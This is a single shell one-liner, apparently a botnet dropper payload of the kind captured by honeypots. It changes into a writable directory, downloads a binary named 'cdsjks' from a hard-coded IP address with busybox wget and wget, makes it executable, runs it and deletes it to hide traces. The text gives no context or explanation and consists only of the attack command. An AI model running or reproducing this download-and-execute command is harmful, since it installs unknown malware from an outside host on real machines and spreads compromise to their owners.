cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; /bin/busybox wget http://168.235.108.197/cdsjks; wget http://168.235.108.197/cdsjks; chmod +x cdsjks; ./cdsjks; rm -rf cdsjks
